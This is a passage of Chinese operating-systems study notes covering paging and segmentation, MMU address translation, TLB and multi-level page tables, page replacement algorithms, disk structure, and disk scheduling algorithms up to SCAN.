<h2 id="分页系统地址映射"><a href="#分页系统地址映射" class="headerlink" title="分页系统地址映射"></a>分页系统地址映射</h2><p>内存管理单元（MMU）管理着地址空间和物理内存的转换，其中的页表（Page table）存储着页（程序地址空间）和页框（物理内存空间）的映射表。</p>
<p>一个虚拟地址分成两个部分，一部分存储页面号，一部分存储偏移量。</p>
<p>下图的页表存放着 16 个页，这 16 个页需要用 4 个比特位来进行索引定位。例如对于虚拟地址（<code>0010 000000000100</code>），前 4 位是存储页面号 2，读取表项内容为（<code>110 1</code>），页表项最后一位表示是否存在于内存中，1 表示存在。后 12 位存储偏移量。这个页对应的页框的地址为（<code>110 000000000100</code>）。</p>
<p><a href="https://qiniu.xiaoming.net.cn/%E5%88%86%E9%A1%B5%E7%B3%BB%E7%BB%9F%E5%9C%B0%E5%9D%80%E6%98%A0%E5%B0%84.png"><img src="https://qiniu.xiaoming.net.cn/%E5%88%86%E9%A1%B5%E7%B3%BB%E7%BB%9F%E5%9C%B0%E5%9D%80%E6%98%A0%E5%B0%84.png" alt="分页系统地址映射"></a></p>
<h2 id="分段存储管理"><a href="#分段存储管理" class="headerlink" title="分段存储管理"></a>分段存储管理</h2><p>虚拟内存采用的是分页技术，也就是将地址空间划分成固定大小的页，每一页再与内存进行映射。</p>
<p>下图为一个编译器在编译过程中建立的多个表，有 4 个表是动态增长的，如果使用分页系统的一维地址空间，动态增长的特点会导致覆盖问题的出现。</p>
<p><a href="https://qiniu.xiaoming.net.cn/%E5%88%86%E6%AE%B51.png"><img src="https://qiniu.xiaoming.net.cn/%E5%88%86%E6%AE%B51.png" alt="分段1"></a></p>
<p>分段的做法是把每个表分成段，一个段构成一个独立的地址空间。每个段的长度可以不同，并且可以动态增长。</p>
<p><a href="https://qiniu.xiaoming.net.cn/%E5%88%86%E6%AE%B52.png"><img src="https://qiniu.xiaoming.net.cn/%E5%88%86%E6%AE%B52.png" alt="分段2"></a></p>
<h2 id="段页式存储管理"><a href="#段页式存储管理" class="headerlink" title="段页式存储管理"></a>段页式存储管理</h2><p>段页式存储管理方式是程序的地址空间划分成多个拥有独立地址空间的段，每个段上的地址空间划分成大小相同的页。这样既拥有分段系统的共享和保护，又拥有分页系统的虚拟内存功能。</p>
<h2 id="分页与分段区别"><a href="#分页与分段区别" class="headerlink" title="分页与分段区别"></a>分页与分段区别</h2><p>共同点 ：</p>
<ul>
<li>分页机制和分段机制都是为了提高内存利用率，较少内存碎片。</li>
<li>页和段都是离散存储的，所以两者都是离散分配内存的方式。但是，每个页和段中的内存是连续的。</li>
</ul>
<p>区别 ：</p>
<ul>
<li>页的大小是固定的，由操作系统决定；而段的大小不固定，取决于我们当前运行的程序。</li>
<li>分页仅仅是为了满足操作系统内存管理的需求，而段是逻辑信息的单位，在程序中可以体现为代码段，数据段，能够更好满足用户的需要。</li>
<li>对程序员的透明性：分页透明，但是分段需要程序员显式划分每个段。</li>
<li>地址空间的维度：分页是一维地址空间，分段是二维的。</li>
<li>大小是否可以改变：页的大小不可变，段的大小可以动态改变。</li>
<li>出现的原因：分页主要用于实现虚拟内存，从而获得更大的地址空间；分段主要是为了使程序和数据可以被划分为逻辑上独立的地址空间并且有助于共享和保护。</li>
</ul>
<h1 id="17-CPU-寻址"><a href="#17-CPU-寻址" class="headerlink" title="17. CPU 寻址"></a>17. CPU 寻址</h1><p>内存通常被组织为一个由 M 个连续的字节大小的单元组成的数组，每个字节都有一个唯一的物理地址（Physical Address PA），作为到数组的索引。CPU 访问内存最简单直接的方法就是使用物理地址，这种寻址方式被称为物理寻址。</p>
<p>现代处理器使用的是一种称为 <strong>虚拟寻址(Virtual Addressing)</strong> 的寻址方式。<strong>使用虚拟寻址，CPU 需要将虚拟地址翻译成物理地址，这样才能访问到真实的物理内存。</strong> 实际上完成虚拟地址转换为物理地址转换的硬件是 CPU 中含有一个被称为 <strong>内存管理单元（Memory Management Unit, MMU）</strong> 的硬件。如下图所示：</p>
<p><a href="http://qiniu.xiaoming.net.cn/CPU%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%8D%95%E5%85%83.png"><img src="http://qiniu.xiaoming.net.cn/CPU%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%8D%95%E5%85%83.png" alt="CPU内存管理单元"></a></p>
<p>虚拟寻址需要硬件与操作系统之间互相合作。<strong>CPU中含有一个被称为内存管理单元（Memory Management Unit, MMU）的硬件，它的功能是将虚拟地址转换为物理地址。MMU需要借助存放在内存中的页表来动态翻译虚拟地址，该页表由操作系统管理。</strong></p>
<h2 id="地址翻译过程"><a href="#地址翻译过程" class="headerlink" title="地址翻译过程"></a>地址翻译过程</h2><p>从形式上来说，<strong>地址翻译是一个N元素的虚拟地址空间中的元素和一个M元素的物理地址空间中元素之间的映射。</strong></p>
<p>下图为MMU利用页表进行寻址的过程：</p>
<p><a href="http://qiniu.xiaoming.net.cn/%E5%9C%B0%E5%9D%80%E7%BF%BB%E8%AF%91%E8%BF%87%E7%A8%8B"><img src="http://qiniu.xiaoming.net.cn/%E5%9C%B0%E5%9D%80%E7%BF%BB%E8%AF%91%E8%BF%87%E7%A8%8B" alt="地址翻译过程"></a></p>
<p>页表基址寄存器（PTBR）指向当前页表。<strong>一个n位的虚拟地址包含两个部分，一个p位的虚拟页面偏移量（Virtual Page Offset, VPO）和一个（n - p）位的虚拟页号（Virtual Page Number, VPN）。</strong></p>
<p><strong>MMU根据VPN来选择对应的PTE</strong>，例如<code>VPN 0</code>代表<code>PTE 0</code>、<code>VPN 1</code>代表<code>PTE 1</code>….因为物理页与虚拟页的大小是一致的，所以物理页面偏移量（Physical Page Offset, PPO）与VPO是相同的。那么之后<strong>只要将PTE中的物理页号（Physical Page Number, PPN）与虚拟地址中的VPO串联起来，就能得到相应的物理地址</strong>。</p>
<p>多级页表的地址翻译也是如此，只不过因为有多个层次，所以VPN需要分成多段。<strong>假设有一个k级页表，虚拟地址会被分割成k个VPN和1个VPO，每个<code>VPN i</code>都是一个到第i级页表的索引</strong>。为了构造物理地址，MMU需要访问k个PTE才能拿到对应的PPN。</p>
<p><a href="http://qiniu.xiaoming.net.cn/%E5%9C%B0%E5%9D%80%E7%BF%BB%E8%AF%91%E8%BF%87%E7%A8%8B2"><img src="http://qiniu.xiaoming.net.cn/%E5%9C%B0%E5%9D%80%E7%BF%BB%E8%AF%91%E8%BF%87%E7%A8%8B2" alt="地址翻译过程2"></a></p>
<h3 id="TLB"><a href="#TLB" class="headerlink" title="TLB"></a>TLB</h3><h4 id="TLB-1"><a href="#TLB-1" class="headerlink" title="TLB"></a>TLB</h4><hr>
<p>页表是被缓存在内存中的，尽管内存的速度相对于硬盘来说已经非常快了，但与CPU还是有所差距。<strong>为了防止每次地址翻译操作都需要去访问内存，CPU使用了高速缓存与TLB来缓存PTE。</strong></p>
<p>在最糟糕的情况下（不包括缺页），MMU需要访问内存取得相应的PTE，这个代价大约为几十到几百个周期，如果PTE凑巧缓存在L1高速缓存中（如果L1没有还会从L2中查找，不过我们忽略多级缓冲区的细节），那么性能开销就会下降到1个或2个周期。然而，许多系统甚至需要消除即使这样微小的开销，TLB由此而生。</p>
<p><a href="http://qiniu.xiaoming.net.cn/TLB"><img src="http://qiniu.xiaoming.net.cn/TLB" alt="TLB"></a></p>
<p>TLB（Translation Lookaside Buffer, TLB）被称为翻译后备缓冲器或翻译旁路缓冲器，它是<strong>MMU中的一个缓冲区，其中每一行都保存着一个由单个PTE组成的块。用于组选择和行匹配的索引与标记字段是从VPN中提取出来的，如果TLB中有<code>T = 2^t</code>个组，那么TLB索引（TLBI）是由VPN的t个最低位组成的，而TLB标记（TLBT）是由VPN中剩余的位组成的。</strong></p>
<p>下图为地址翻译的流程（TLB命中的情况下）：</p>
<p><a href="http://qiniu.xiaoming.net.cn/TLB%E5%91%BD%E4%B8%AD%E6%83%85%E5%86%B5%E4%B8%8B%E5%9C%B0%E5%9D%80%E7%BF%BB%E8%AF%91%E8%BF%87%E7%A8%8B"><img src="http://qiniu.xiaoming.net.cn/TLB%E5%91%BD%E4%B8%AD%E6%83%85%E5%86%B5%E4%B8%8B%E5%9C%B0%E5%9D%80%E7%BF%BB%E8%AF%91%E8%BF%87%E7%A8%8B" alt="TLB命中情况下地址翻译过程"></a></p>
<ul>
<li>第一步，CPU将一个虚拟地址交给MMU进行地址翻译。</li>
<li>第二步和第三步，MMU通过TLB取得相应的PTE。</li>
<li>第四步，MMU通过PTE翻译出物理地址并将它发送给高速缓存/内存。</li>
<li>第五步，高速缓存返回数据到CPU（如果缓存命中的话，否则还需要访问内存）。</li>
</ul>
<p><strong>当TLB未命中时，MMU必须从高速缓存/内存中取出相应的PTE，并将新取得的PTE存放到TLB（如果TLB已满会覆盖一个已经存在的PTE）。</strong></p>
<p><a href="http://qiniu.xiaoming.net.cn/TLB%E6%9C%AA%E5%91%BD%E4%B8%AD"><img src="http://qiniu.xiaoming.net.cn/TLB%E6%9C%AA%E5%91%BD%E4%B8%AD" alt="TLB未命中"></a></p>
<h1 id="18-页表，快表和多级页表"><a href="#18-页表，快表和多级页表" class="headerlink" title="18. 页表，快表和多级页表"></a>18. 页表，快表和多级页表</h1><h2 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h2><p>虚拟内存空间被组织为一个存放在硬盘上的M个连续的字节大小的单元组成的数组，每个字节都有一个唯一的虚拟地址，作为到数组的索引（这点其实与物理内存是一样的）。</p>
<p><strong>操作系统通过将虚拟内存分割为大小固定的块来作为硬盘和内存之间的传输单位，这个块被称为虚拟页（Virtual Page, VP），每个虚拟页的大小为<code>P=2^p</code>字节。物理内存也会按照这种方法分割为物理页（Physical Page, PP），大小也为<code>P</code>字节。</strong></p>
<p>CPU在获得虚拟地址之后，需要通过MMU将虚拟地址翻译为物理地址。而在翻译的过程中还需要借助页表，所谓<strong>页表就是一个存放在物理内存中的数据结构，它记录了虚拟页与物理页的映射关系。</strong></p>
<p><strong>页表是一个元素为页表条目（Page Table Entry, PTE）的集合，每个虚拟页在页表中一个固定偏移量的位置上都有一个PTE</strong>。下面是PTE仅含有一个有效位标记的页表结构，该有效位代表这个虚拟页是否被缓存在物理内存中。</p>
<p><a href="http://qiniu.xiaoming.net.cn/%E9%A1%B5%E8%A1%A8%E7%BB%93%E6%9E%84"><img src="http://qiniu.xiaoming.net.cn/%E9%A1%B5%E8%A1%A8%E7%BB%93%E6%9E%84" alt="页表结构"></a></p>
<p>虚拟页<code>VP 0</code>、<code>VP 4</code>、<code>VP 6</code>、<code>VP 7</code>被缓存在物理内存中，虚拟页<code>VP 2</code>和<code>VP 5</code>被分配在页表中，但并没有缓存在物理内存，虚拟页<code>VP 1</code>和<code>VP 3</code>还没有被分配。</p>
<p>在进行动态内存分配时，例如<code>malloc()</code>函数或者其他高级语言中的<code>new</code>关键字，操作系统会在硬盘中创建或申请一段虚拟内存空间，并更新到页表（分配一个PTE，使该PTE指向硬盘上这个新创建的虚拟页）。</p>
<p><strong>由于CPU每次进行地址翻译的时候都需要经过PTE，所以如果想控制内存系统的访问，可以在PTE上添加一些额外的许可位（例如读写权限、内核权限等）</strong>，这样只要有指令违反了这些许可条件，CPU就会触发一个一般保护故障，将控制权传递给内核中的异常处理程序。一般这种异常被称为“段错误（Segmentation Fault）”。</p>
<h3 id="页命中"><a href="#页命中" class="headerlink" title="页命中"></a>页命中</h3><p><a href="http://qiniu.xiaoming.net.cn/%E9%A1%B5%E5%91%BD%E4%B8%AD"><img src="http://qiniu.xiaoming.net.cn/%E9%A1%B5%E5%91%BD%E4%B8%AD" alt="页命中"></a></p>
<p>如上图所示，MMU根据虚拟地址在页表中寻址到了<code>PTE 4</code>，该PTE的有效位为1，代表该虚拟页已经被缓存在物理内存中了，最终MMU得到了PTE中的物理内存地址（指向<code>PP 1</code>）。</p>
<h3 id="缺页"><a href="#缺页" class="headerlink" title="缺页"></a>缺页</h3><p><a href="http://qiniu.xiaoming.net.cn/%E7%BC%BA%E9%A1%B5"><img src="http://qiniu.xiaoming.net.cn/%E7%BC%BA%E9%A1%B5" alt="缺页"></a></p>
<p>如上图所示，MMU根据虚拟地址在页表中寻址到了<code>PTE 2</code>，该PTE的有效位为0，代表该虚拟页并没有被缓存在物理内存中。<strong>虚拟页没有被缓存在物理内存中（缓存未命中）被称为缺页。</strong></p>
<p><strong>当CPU遇见缺页时会触发一个缺页异常，缺页异常将控制权转向操作系统内核，然后调用内核中的缺页异常处理程序，该程序会选择一个牺牲页，如果牺牲页已被修改过，内核会先将它复制回硬盘（采用写回机制而不是直写也是为了尽量减少对硬盘的访问次数），然后再把该虚拟页覆盖到牺牲页的位置，并且更新PTE。</strong></p>
<p><strong>当缺页异常处理程序返回时，它会重新启动导致缺页的指令，该指令会把导致缺页的虚拟地址重新发送给MMU</strong>。由于现在已经成功处理了缺页异常，所以最终结果是页命中，并得到物理地址。</p>
<p>这种在硬盘和内存之间传送页的行为称为页面调度（paging）：页从硬盘换入内存和从内存换出到硬盘。当缺页异常发生时，才将页面换入到内存的策略称为按需页面调度（demand paging），所有现代操作系统基本都使用的是按需页面调度的策略。</p>
<p><strong>虚拟内存跟CPU高速缓存（或其他使用缓存的技术）一样依赖于局部性原则</strong>。虽然处理缺页消耗的性能很多（毕竟还是要从硬盘中读取），而且程序在运行过程中引用的不同虚拟页的总数可能会超出物理内存的大小，但是<strong>局部性原则保证了在任意时刻，程序将趋向于在一个较小的活动页面（active page）集合上工作，这个集合被称为工作集（working set）</strong>。根据空间局部性原则（一个被访问过的内存地址以及其周边的内存地址都会有很大几率被再次访问）与时间局部性原则（一个被访问过的内存地址在之后会有很大几率被再次访问），只要将工作集缓存在物理内存中，接下来的地址翻译请求很大几率都在其中，从而减少了额外的硬盘流量。</p>
<p>如果一个程序没有良好的局部性，将会使工作集的大小不断膨胀，直至超过物理内存的大小，这时程序会产生一种叫做抖动（thrashing）的状态，页面会不断地换入换出，如此多次的读写硬盘开销，性能自然会十分“恐怖”。<strong>所以，想要编写出性能高效的程序，首先要保证程序的时间局部性与空间局部性。</strong></p>
<h2 id="快表"><a href="#快表" class="headerlink" title="快表"></a>快表</h2><p>在分页内存管理中，很重要的两点是：</p>
<ul>
<li>虚拟地址到物理地址的转换要快。</li>
<li>解决虚拟地址空间大，页表也会很大的问题。</li>
</ul>
<p>为了解决虚拟地址到物理地址的转换速度，操作系统在页表方案基础之上引入了快表，来加速虚拟地址到物理地址的转换。我们可以把快表理解为一种特殊的高速缓冲存储器（Cache），其中的内容是页表的一部分或者全部内容。作为页表的Cache，它的作用与页表相似，但是提高了访问速率。由于采用页表做地址转换，读写内存数据时 CPU 要访问两次主存。有了快表，有时只要访问一次高速缓冲存储器，一次主存，这样可加速查找并提高指令执行速度。</p>
<p>使用快表之后的地址转换流程是这样的：</p>
<ul>
<li>根据虚拟地址中的页号查快表；</li>
<li>如果该页在快表中，直接从快表中读取相应的物理地址；</li>
<li>如果该页不在快表中，就访问内存中的页表，再从页表中得到物理地址，同时将页表中的该映射表项添加到快表中；</li>
<li>当快表填满后，又要登记新页时，就按照一定的淘汰策略淘汰掉快表中的一个页。</li>
</ul>
<p>看完了之后会发现快表和我们平时经常在我们开发的系统使用的缓存（比如 Redis）很像，的确是这样的，操作系统中的很多思想、很多经典的算法，都可以在我们日常开发使用的各种工具或者框架中找到它们的影子。</p>
<h2 id="多级页表"><a href="#多级页表" class="headerlink" title="多级页表"></a>多级页表</h2><p>现代的大多数计算机系统，都支持非常大的逻辑地址空间(232～264)。在这样的环境下，页表就变得非常大，要占用相当大的内存空间。例如，对于一个具有 32 位逻辑地址空间的分页系统，规定页面大小为 4 KB 即 2 的 12 次方，则在每个进程页表中的页表项可达 1 兆个之多。 又因为每个页表项占用一个字节，故每个进程仅仅其页表就要占用 1 MB 的内存空间，而且还要求是连续的。显然这是不现实的，可以采用下述两个方法来解决这一问题：</p>
<ol>
<li>采用离散分配方式来解决难以找到一块连续的大内存空间的问题；</li>
<li>只将当前需要的部分页表项调入内存，其余的页表项仍驻留在磁盘上，需要时再调入。</li>
</ol>
<h3 id="两级页表"><a href="#两级页表" class="headerlink" title="两级页表"></a>两级页表</h3><p>对于要求连续的内存空间来存放页表的问题，可利用将页表进行分页，并离散地将各个页面分别存放在不同的物理块中的办法来加以解决，同样也要为离散分配的页表再建立一张页表，称为外层页表，在每个页表项中记录了页表页面的物理块号。</p>
<p><a href="http://qiniu.xiaoming.net.cn/%E4%B8%A4%E7%BA%A7%E9%A1%B5%E8%A1%A8%E7%BB%93%E6%9E%84.png"><img src="http://qiniu.xiaoming.net.cn/%E4%B8%A4%E7%BA%A7%E9%A1%B5%E8%A1%A8%E7%BB%93%E6%9E%84.png" alt="两级页表结构"></a></p>
<p>引入多级页表的主要目的是为了避免把全部页表一直放在内存中占用过多空间，特别是那些根本就不需要的页表就不需要保留在内存中。多级页表属于时间换空间的典型场景。</p>
<p>假设我们的环境为一个32位的虚拟地址空间，它有如下形式：</p>
<ul>
<li>虚拟地址空间被分为4KB的页，每个PTE都是4字节。</li>
<li>内存的前2K个页面分配给了代码和数据。</li>
<li>之后的6K个页面还未被分配。</li>
<li>再接下来的1023个页面也未分配，其后的1个页面分配给了用户栈。</li>
</ul>
<p>下图是为该虚拟地址空间构造的二级页表层次结构（真实情况中多为四级或更多），一级页表（1024个PTE正好覆盖4GB的虚拟地址空间，同时每个PTE只有4字节，这样一级页表与二级页表的大小也正好与一个页面的大小一致都为4KB）的每个PTE负责映射虚拟地址空间中一个4MB的片（chunk），每一片都由1024个连续的页面组成。二级页表中的每个PTE负责映射一个4KB的虚拟内存页面。</p>
<p><a href="http://qiniu.xiaoming.net.cn/%E5%A4%9A%E7%BA%A7%E9%A1%B5%E8%A1%A8%E7%A4%BA%E4%BE%8B"><img src="http://qiniu.xiaoming.net.cn/%E5%A4%9A%E7%BA%A7%E9%A1%B5%E8%A1%A8%E7%A4%BA%E4%BE%8B" alt="多级页表示例"></a></p>
<p>这个结构看起来很像是一个<code>B-Tree</code>，这种层次结构有效的减缓了内存要求：</p>
<ul>
<li>如果一个一级页表的一个PTE是空的，那么相应的二级页表也不会存在。这代表一种巨大的潜在节约（对于一个普通的程序来说，虚拟地址空间的大部分都会是未分配的）。</li>
<li>只有一级页表才总是需要缓存在内存中的，这样虚拟内存系统就可以在需要时创建、页面调入或调出二级页表（只有经常使用的二级页表才会被缓存在内存中），这就减少了内存的压力。</li>
</ul>
<p>为了提高内存的空间性能，提出了多级页表的概念；但是提到空间性能是以浪费时间性能为基础的，因此为了补充损失的时间性能，提出了快表（即TLB）的概念。 不论是快表还是多级页表实际上都利用到了程序的局部性原理。</p>
<h1 id="19-虚拟存储器"><a href="#19-虚拟存储器" class="headerlink" title="19. 虚拟存储器"></a>19. 虚拟存储器</h1><p>基于局部性原理，在程序装入时，可以将程序的一部分装入内存，而将其他部分留在外存，就可以启动程序执行。由于外存往往比内存大很多，所以我们运行的软件的内存大小实际上是可以比计算机系统实际的内存大小大的。在程序执行过程中，当所访问的信息不在内存时，由操作系统将所需要的部分调入内存，然后继续执行程序。另一方面，操作系统将内存中暂时不使用的内容换到外存上，从而腾出空间存放将要调入内存的信息。这样，计算机好像为用户提供了一个比实际内存大的多的存储器——<strong>虚拟存储器</strong>。</p>
<p>实际上，我觉得虚拟内存同样是一种时间换空间的策略，你用 CPU 的计算时间，页的调入调出花费的时间，换来了一个虚拟的更大的空间来支持程序的运行。不得不感叹，程序世界几乎不是时间换空间就是空间换时间。</p>
<h1 id="20-页面置换算法"><a href="#20-页面置换算法" class="headerlink" title="20. 页面置换算法"></a>20. 页面置换算法</h1><p>在进程运行过程中，若其所要访问的页面不在内存而需把它们调入内存，但内存已无空闲空间时，为了保证该进程能正常运行，系统必须从内存中调出一页程序或数据送磁盘的对换区中。但应将哪个页面调出，须根据一定的算法来确定。通常，把选择换出页面的算法称为页面置换算法。</p>
<blockquote>
<p>一个好的页面置换算法，应具有较低的页面更换频率。从理论上讲，应将那些以后不再会访问的页面换出，或把那些在较长时间内不会再访问的页面调出。</p>
</blockquote>
<blockquote>
<p><strong>抖动</strong>：刚被换出的页很快又被访问，需重新调入，又需再选一页调出，如此频繁地更换页面的现象。抖动导致进程在运行中，把大部分时间花费在页面置换中。</p>
</blockquote>
<p>地址映射过程中，若在页面中发现所要访问的页面不在内存中，则发生缺页中断 。</p>
<blockquote>
<p><strong>缺页中断</strong> 就是要访问的<strong>页</strong>不在主存，需要操作系统将其调入主存后再进行访问。 在这个时候，被内存映射的文件实际上成了一个分页交换文件。</p>
</blockquote>
<p>当发生缺页中断时，如果当前内存中并没有空闲的页面，操作系统就必须在内存选择一个页面将其移出内存，以便为即将调入的页面让出空间。用来选择淘汰哪一页的规则叫做页面置换算法，我们可以把页面置换算法看成是淘汰页面的规则。</p>
<h2 id="最佳置换算法"><a href="#最佳置换算法" class="headerlink" title="最佳置换算法"></a>最佳置换算法</h2><blockquote>
<p>OPT, Optimal replacement algorithm</p>
</blockquote>
<p>其所选择的被淘汰页面，将是以后永不使用的，或许是在最长(未来)时间内不再被访问的页面。<br>采用最佳置换算法， 通常可保证获得最低的缺页率。但由于无法预知一个进程在内存的若干个页面中，哪一个页面是未来最长时间内不再被访问的，因而该算法是无法实现的，但可以利用该算法去评价其它算法。</p>
<p>举例：一个系统为某进程分配了三个物理块，并有如下页面引用序列：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">7</span>，<span class="number">0</span>，<span class="number">1</span>，<span class="number">2</span>，<span class="number">0</span>，<span class="number">3</span>，<span class="number">0</span>，<span class="number">4</span>，<span class="number">2</span>，<span class="number">3</span>，<span class="number">0</span>，<span class="number">3</span>，<span class="number">2</span>，<span class="number">1</span>，<span class="number">2</span>，<span class="number">0</span>，<span class="number">1</span>，<span class="number">7</span>，<span class="number">0</span>，<span class="number">1</span></span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p>开始运行时，先将 7, 0, 1 三个页面装入内存。当进程要访问页面 2 时，产生缺页中断，会将页面 7 换出，因为页面 7 再次被访问的时间最长。</p>
<h2 id="最近最久未使用置换算法"><a href="#最近最久未使用置换算法" class="headerlink" title="最近最久未使用置换算法"></a>最近最久未使用置换算法</h2><blockquote>
<p>LRU, Least Recently Used</p>
</blockquote>
<p>根据页面调入内存后的使用情况进行决策的。由于无法预测各页面将来的使用情况，只能利用“最近的过去”作为“最近的将来”的近似，因此，LRU 置换算法是选择最近最久未使用的页面予以淘汰。该算法赋予每个页面一个访问字段，用来记录一个页面自上次被访问以来所经历的时间 t，当须淘汰一个页面时，选择现有页面中其 t 值最大的，即最近最久未使用的页面予以淘汰。</p>
<h2 id="先进先出页面置换算法"><a href="#先进先出页面置换算法" class="headerlink" title="先进先出页面置换算法"></a>先进先出页面置换算法</h2><blockquote>
<p>FIFO, First In First Out</p>
</blockquote>
<p>该算法总是淘汰最先进入内存的页面，即选择在内存中驻留时间最久的页面予以淘汰。该算法把一个进程已调入内存的页面，按先后次序链接成一个队列，并设置一个指针，称为替换指针，使它总是指向最老的页面。</p>
<h2 id="Clock置换算法-最近未使用算法"><a href="#Clock置换算法-最近未使用算法" class="headerlink" title="Clock置换算法/最近未使用算法"></a>Clock置换算法/最近未使用算法</h2><blockquote>
<p>Clock / NUR Not Recently Used</p>
</blockquote>
<p>当采用简单 Clock 算法时，只需为每页设置一位访问位，再将内存中的所有页面都通过链接指针链接成一个循环队列。当某页被访问时，其访问位被置 1。置换算法在选择一页淘汰时，只需检查页的访问位。如果是 0，就选择该页换出；若为 1，则重新将它置 0，暂不换出，而给该页第二次驻留内存的机会，再按照 FIFO 算法检查下一个页面。当检查到队列中的最后一个页面时，若其访问位仍为 1，则再返回到队首去检查第一个页面。由于该算法是循环地检查各页面的使用情况，故称为 Clock 算法。但因该算法只有一位访问位，只能用它表示该页是否已经使用过，而置换时是将未使用过的页面换出去，故又把该算法称为最近未用算法 NRU(Not Recently Used)。</p>
<h2 id="最少使用（LFU）置换算法"><a href="#最少使用（LFU）置换算法" class="headerlink" title="最少使用（LFU）置换算法"></a>最少使用（LFU）置换算法</h2><p>在采用最少使用置换算法时，应为在内存中的每个页面设置一个移位寄存器，用来记录该页面被访问的频率。该置换算法选择在最近时期使用最少的页面作为淘汰页。</p>
<h1 id="21-磁盘存储器的结构"><a href="#21-磁盘存储器的结构" class="headerlink" title="21. 磁盘存储器的结构"></a>21. 磁盘存储器的结构</h1><p>磁盘设备可包括一或多个物理盘片，每个磁盘片分一个或两个存储面(surface)，每个磁盘面被组织成若干个同心环，这种环称为磁道(track)，各磁道之间留有必要的间隙。为使处理简单起见，在每条磁道上可存储相同数目的二进制位。这样，磁盘密度即每英寸中所存储的位数，显然是内层磁道的密度较外层磁道的密度高。每条磁道又被逻辑上划分成若干个扇区(sectors)，软盘大约为 8～32 个扇区，硬盘则可多达数百个。一个扇区称为一个盘块(或数据块)，常常叫做磁盘扇区。各扇区之间保留一定的间隙。</p>
<ul>
<li>盘面（Platter）：一个磁盘有多个盘面；</li>
<li>磁道（Track）：盘面上的圆形带状区域，一个盘面可以有多个磁道；</li>
<li>扇区（Track Sector）：磁道上的一个弧段，一个磁道可以有多个扇区，它是<strong>最小的物理储存单位</strong>，目前主要有 512 bytes 与 4 K 两种大小；</li>
<li>磁头（Head）：与盘面非常接近，能够将盘面上的磁场转换为电信号（读），或者将电信号转换为盘面的磁场（写）；</li>
<li>制动手臂（Actuator arm）：用于在磁道之间移动磁头；</li>
<li>主轴（Spindle）：使整个盘面转动。</li>
</ul>
<p><a href="https://qiniu.xiaoming.net.cn/%E7%A3%81%E7%9B%98%E7%BB%93%E6%9E%84.jpg"><img src="https://qiniu.xiaoming.net.cn/%E7%A3%81%E7%9B%98%E7%BB%93%E6%9E%84.jpg" alt="磁盘结构"></a></p>
<h1 id="22-磁盘调度算法"><a href="#22-磁盘调度算法" class="headerlink" title="22. 磁盘调度算法"></a>22. 磁盘调度算法</h1><p>磁盘设备在工作时以恒定速率旋转。为了读或写，磁头必须能移动到所要求的磁道上，并等待所要求的扇区的开始位置旋转到磁头下，然后再开始读或写数据。读写一个磁盘块的时间的影响因素有：</p>
<ul>
<li><p>寻道时间Ts:指把磁臂(磁头)移动到指定磁道上所经历的时间。该时间是启动磁臂的时间 s 与磁头移动 n 条磁道所花费的时间之和。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// m是一个常数，与磁盘驱动器的速度有关</span></span><br><span class="line">Ts = m x n + s</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>
</li>
<li><p>旋转延迟时间Tr：这是指定扇区移动到磁头下面所经历的时间。不同的磁盘类型中，旋转速度至少相差一个数量级，如软盘为 300 r/min，硬盘一般为7200～15 000 r/min，甚至更高。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">平均旋转延迟时间Tr = <span class="number">1</span>/2r（r为磁盘每秒的转数）</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>
</li>
<li><p>传输时间Tt。这是指把数据从磁盘读出或向磁盘写入数据所经历的时间。Tt 的大小与每次所读/写的字节数 b 和旋转速度有关:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// r为磁盘每秒的转数</span></span><br><span class="line"><span class="comment">// N为一条磁道上的字节数，当一次读/写的字节数相当于半条磁道上的字节数时，Tt与 Tr相同。</span></span><br><span class="line">Tt = b / (r x N)</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>综上，访问时间 Ta 可以表示为：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Ta = Ts + <span class="number">1</span>/2r + b/(rN)</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p>磁盘是可供多个进程共享的设备，当有多个进程都要求访问磁盘时，应采用一种最佳调度算法，以使各进程对磁盘的平均访问时间最小。</p>
<h2 id="先来先服务"><a href="#先来先服务" class="headerlink" title="先来先服务"></a>先来先服务</h2><blockquote>
<p>FCFS, First Come First Served</p>
</blockquote>
<p>根据进程请求访问磁盘的先后次序进行调度。此算法的优点是公平、简单，且每个进程的请求都能依次地得到处理，不会出现某一进程的请求长期得不到满足的情况。但此算法由于未对寻道进行优化，致使平均寻道时间可能较长。</p>
<h2 id="最短寻道时间优先"><a href="#最短寻道时间优先" class="headerlink" title="最短寻道时间优先"></a>最短寻道时间优先</h2><blockquote>
<p>SSTF, Shortest Seek Time First</p>
</blockquote>
<p>其要求访问的磁道与当前磁头所在的磁道距离最近，以使每次的寻道时间最短。但这种算法不能保证平均寻道时间最短。</p>
<p>SSTF 算法虽然能获得较好的寻道性能，但却可能导致某个进程发生“饥饿”现象。因为只要不断有新进程的请求到达，且其所要访问的磁道与磁头当前所在磁道的距离较近，这种新进程的 I/O 请求必然优先满足。</p>
<h2 id="扫描算法"><a href="#扫描算法" class="headerlink" title="扫描算法"></a>扫描算法</h2><blockquote>
<p>SCAN</p>
</blockquote>
<p>该算法不仅考虑到欲访问的磁道与当前磁道间的距离，更优先考虑的是磁头当前的移动方向。例如，当磁头正在自里向外移动时，SCAN 算法所考虑的下一个访问对象，应是其欲访问的磁道既在当前磁道之外，又是距离最近的。这样自里向外地访问，直至再无更外的磁道需要访问时，才将磁臂换向为自外向里移动。这时，同样也是每次选择这样的进程来调度，即要访问的磁道在当前位置内距离最近者，这样，磁头又逐步地从外向里移动，直至再无更里面的磁道要访问，从而避免了出现“饥饿”现象。由于在这种算法中磁头移动的规律颇似电梯的运行，因而又常称之为电梯调度算法。</p>
